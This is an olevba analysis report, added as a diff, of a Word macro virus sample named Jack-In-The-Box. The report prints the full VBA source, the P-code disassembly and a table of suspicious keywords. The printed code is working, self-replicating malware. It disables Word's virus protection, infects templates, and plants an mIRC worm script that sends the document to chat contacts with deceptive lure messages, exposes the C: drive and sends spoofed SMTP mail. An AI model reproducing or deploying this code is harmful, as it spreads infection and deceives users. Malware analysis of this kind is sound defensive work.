@@ -1,0 +1,748 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Story.ad
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Story.ad - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Close()
+On Error Resume Next
+'Jack-In-The-Box
+Set Something = Options
+Something.VirusProtection = 0
+Something.ConfirmConversions = 0
+Something.SaveNormalP --------rompt = 0
+Application.EnableCancelKey = 0
+Application.StatusBar = 0
+Application.ScreenUpdating = 0
+Set AnI = ActiveDocument.VBProject.VBComponents(1)
+Set BnI = NormalTemplate.VBProject.VBComponents(1)
+If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
+If UCase(BnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InB = 1
+If InA = 1 And InB = 1 Then Exit Sub
+Set CnI = MacroContainer.VBProject.VBComponents.Item(1)
+VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
+If InA = 1 Then BnI.CodeModule.AddFromString ("Private Sub Document_Close" & Chr(13) & VCode)
+If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
+NormalTemplate.Save
+somename = ActiveDocument.Name
+DoEvents
+If InB = 1 Then
+If Dir("C:\mirc\mirc32.exe") <> "" Then
+var3 = "C:\mirc\script.ini"
+If System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
+If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
+If Dir(var3) <> "" Then Kill var3
+Open "C:\mirc\script.ini" For Output As #1
+Print #1, "[script]"
+Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
+Print #1, "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
+Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
+Print #1, "n3=On 1:Unotify: .clear -s"
+Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
+Print #1, "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
+Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
+DoEvents
+Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
+Print #1, "n8=On 1:Text:*script*:*: .ignore $nick"
+Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
+Print #1, "n10=On 1:Text:*virus*:*: .ignore $nick"
+Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
+Print #1, "n12=On 1:Text:*Jack*Box*:*: .ignore $nick"
+Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
+Print #1, "n14=On 1:Text:*Story.doc*: .ignore $nick"
+Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+DoEvents
+Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+Print #1, "n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+Print #1, "n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5"
+Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
+Print #1, "n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }"
+Close #1
+If Dir("C:\windows\Story.doc") = "" Then
+ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
+End If
+End If
+If Left(somename, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
+End If
+CommandBars("Tools").Controls("Macro").Enabled = 0
+CommandBars("Tools").Controls("Customize...").Enabled = 0
+CommandBars("View").Controls("Toolbars").Enabled = 0
+CommandBars("View").Controls("Status Bar").Enabled = 0
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Story.ad
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 16064 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_Close())
+' Line #1:
+' 	OnError (Resume Next) 
+' Line #2:
+' 	QuoteRem 0x0000 0x000F "Jack-In-The-Box"
+' Line #3:
+' 	SetStmt 
+' 	Ld Options 
+' 	Set Something 
+' Line #4:
+' 	LitDI2 0x0000 
+' 	Ld Something 
+' 	MemSt VirusProtection 
+' Line #5:
+' 	LitDI2 0x0000 
+' 	Ld Something 
+' 	MemSt ConfirmConversions 
+' Line #6:
+' 	Ld rompt 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	UMi 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	Ld Something 
+' 	ArgsMemCall SaveNormalP 0x0001 
+' Line #7:
+' 	LitDI2 0x0000 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #8:
+' 	LitDI2 0x0000 
+' 	Ld Application 
+' 	MemSt StatusBar 
+' Line #9:
+' 	LitDI2 0x0000 
+' 	Ld Application 
+' 	MemSt ScreenUpdating 
+' Line #10:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	Set AnI 
+' Line #11:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	Set BnI 
+' Line #12:
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	Ld AnI 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "'JACK-IN-THE-BOX"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St InA 
+' 	EndIf 
+' Line #13:
+' 	LitDI2 0x0003 
+' 	LitDI2 0x0001 
+' 	Ld BnI 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "'JACK-IN-THE-BOX"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitDI2 0x0001 
+' 	St InB 
+' 	EndIf 
+' Line #14:
+' 	Ld InA 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	Ld InB 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #15:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld MacroContainer 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set CnI 
+' Line #16:
+' 	LitDI2 0x0002 
+' 	Ld CnI 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld CnI 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St VCode 
+' Line #17:
+' 	Ld InA 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x001A "Private Sub Document_Close"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	Ld VCode 
+' 	Concat 
+' 	Paren 
+' 	Ld BnI 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' 	EndIf 
+' Line #18:
+' 	Ld InB 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0019 "Private Sub Document_Open"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	Ld VCode 
+' 	Concat 
+' 	Paren 
+' 	Ld AnI 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' 	EndIf 
+' Line #19:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #20:
+' 	Ld ActiveDocument 
+' 	MemLd New 
+' 	St somename 
+' Line #21:
+' 	ArgsCall DoEvents 0x0000 
+' Line #22:
+' 	Ld InB 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #23:
+' 	LitStr 0x0012 "C:\mirc\mirc32.exe"
+' 	ArgsLd Dir 0x0001 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	IfBlock 
+' Line #24:
+' 	LitStr 0x0012 "C:\mirc\script.ini"
+' 	St var3 
+' Line #25:
+' 	LitStr 0x0010 "C:\mirc\mirc.ini"
+' 	LitStr 0x0004 "warn"
+' 	LitStr 0x0006 "fserve"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0003 "off"
+' 	LitStr 0x0010 "C:\mirc\mirc.ini"
+' 	LitStr 0x0004 "warn"
+' 	LitStr 0x0006 "fserve"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' 	EndIf 
+' Line #26:
+' 	LitStr 0x0010 "C:\mirc\mirc.ini"
+' 	LitStr 0x000A "fileserver"
+' 	LitStr 0x0007 "warning"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0003 "off"
+' 	LitStr 0x0010 "C:\mirc\mirc.ini"
+' 	LitStr 0x000A "fileserver"
+' 	LitStr 0x0007 "warning"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' 	EndIf 
+' Line #27:
+' 	Ld var3 
+' 	ArgsLd Dir 0x0001 
+' 	LitStr 0x0000 ""
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	Ld var3 
+' 	ArgsCall Kill 0x0001 
+' 	EndIf 
+' Line #28:
+' 	LitStr 0x0012 "C:\mirc\script.ini"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Output)
+' Line #29:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0008 "[script]"
+' 	PrintItemNL 
+' Line #30:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0396 "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
+' 	PrintItemNL 
+' Line #31:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x009C "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
+' 	PrintItemNL 
+' Line #32:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0229 "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
+' 	PrintItemNL 
+' Line #33:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x001A "n3=On 1:Unotify: .clear -s"
+' 	PrintItemNL 
+' Line #34:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0097 "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
+' 	PrintItemNL 
+' Line #35:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0052 "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
+' 	PrintItemNL 
+' Line #36:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x01DA "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
+' 	PrintItemNL 
+' Line #37:
+' 	ArgsCall DoEvents 0x0000 
+' Line #38:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0032 "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
+' 	PrintItemNL 
+' Line #39:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0026 "n8=On 1:Text:*script*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #40:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0024 "n9=On 1:Text:*worm*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #41:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0026 "n10=On 1:Text:*virus*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #42:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0027 "n11=On 1:Text:*infect*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #43:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0029 "n12=On 1:Text:*Jack*Box*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #44:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0026 "n13=On 1:Text:*macro*:*: .ignore $nick"
+' 	PrintItemNL 
+' Line #45:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0028 "n14=On 1:Text:*Story.doc*: .ignore $nick"
+' 	PrintItemNL 
+' Line #46:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0052 "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+' 	PrintItemNL 
+' Line #47:
+' 	ArgsCall DoEvents 0x0000 
+' Line #48:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0051 "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+' 	PrintItemNL 
+' Line #49:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0053 "n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+' 	PrintItemNL 
+' Line #50:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0055 "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
+' 	PrintItemNL 
+' Line #51:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x039B "n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5"
+' 	PrintItemNL 
+' Line #52:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0144 "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
+' 	PrintItemNL 
+' Line #53:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x00E7 "n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }"
+' 	PrintItemNL 
+' Line #54:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #55:
+' 	LitStr 0x0014 "C:\windows\Story.doc"
+' 	ArgsLd Dir 0x0001 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	IfBlock 
+' Line #56:
+' 	LitStr 0x0014 "C:\Windows\Story.doc"
+' 	ParamNamed FileName 
+' 	LitVarSpecial (False)
+' 	ParamNamed AddToRecentFiles 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0002 
+' Line #57:
+' 	EndIfBlock 
+' Line #58:
+' 	EndIfBlock 
+' Line #59:
+' 	Ld somename 
+' 	LitDI2 0x0008 
+' 	ArgsLd LBound 0x0002 
+' 	LitStr 0x0008 "Document"
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed FileName 
+' 	Ld wdFormatDocument 
+' 	ParamNamed FileFormat 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0002 
+' 	EndIf 
+' Line #60:
+' 	EndIfBlock 
+' Line #61:
+' 	LitDI2 0x0000 
+' 	LitStr 0x0005 "Macro"
+' 	LitStr 0x0005 "Tools"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #62:
+' 	LitDI2 0x0000 
+' 	LitStr 0x000C "Customize..."
+' 	LitStr 0x0005 "Tools"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #63:
+' 	LitDI2 0x0000 
+' 	LitStr 0x0008 "Toolbars"
+' 	LitStr 0x0004 "View"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #64:
+' 	LitDI2 0x0000 
+' 	LitStr 0x000A "Status Bar"
+' 	LitStr 0x0004 "View"
+' 	ArgsLd CommandBars 0x0001 
+' 	ArgsMemLd Controls 0x0001 
+' 	MemSt Enabled 
+' Line #65:
+' 	EndSub 
+' Line #66:
+' Line #67:
+' Line #68:
+' Line #69:
+' Line #70:
+' Line #71:
+' Line #72:
+' Line #73:
+' Line #74:
+' Line #75:
+' Line #76:
+' Line #77:
+' Line #78:
+' Line #79:
+' Line #80:
+' Line #81:
+' Line #82:
+' Line #83:
+' Line #84:
+' Line #85:
+' Line #86:
+' Line #87:
+' Line #88:
+' Line #89:
+' Line #90:
+' Line #91:
+' Line #92:
+' Line #93:
+' Line #94:
+' Line #95:
+' Line #96:
+' Line #97:
+' Line #98:
+' Line #99:
+' Line #100:
+' Line #101:
+' Line #102:
+' Line #103:
+' Line #104:
+' Line #105:
+' Line #106:
+' Line #107:
+' Line #108:
+' Line #109:
+' Line #110:
+' Line #111:
+' Line #112:
+' Line #113:
+' Line #114:
+' Line #115:
+' Line #116:
+' Line #117:
+' Line #118:
+' Line #119:
+' Line #120:
+' Line #121:
+' Line #122:
+' Line #123:
+' Line #124:
+' Line #125:
+' Line #126:
+' Line #127:
+' Line #128:
+' Line #129:
+' Line #130:
+' Line #131:
+' Line #132:
+' Line #133:
+' Line #134:
+' Line #135:
+' Line #136:
+' Line #137:
+' Line #138:
+' Line #139:
+' Line #140:
+' Line #141:
+' Line #142:
+' Line #143:
+' Line #144:
+' Line #145:
+' Line #146:
+' Line #147:
+' Line #148:
+' Line #149:
+' Line #150:
+' Line #151:
+' Line #152:
+' Line #153:
+' Line #154:
+' Line #155:
+' Line #156:
+' Line #157:
+' Line #158:
+' Line #159:
+' Line #160:
+' Line #161:
+' Line #162:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|write               |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|System              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |mirc32.exe          |Executable file name                         |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
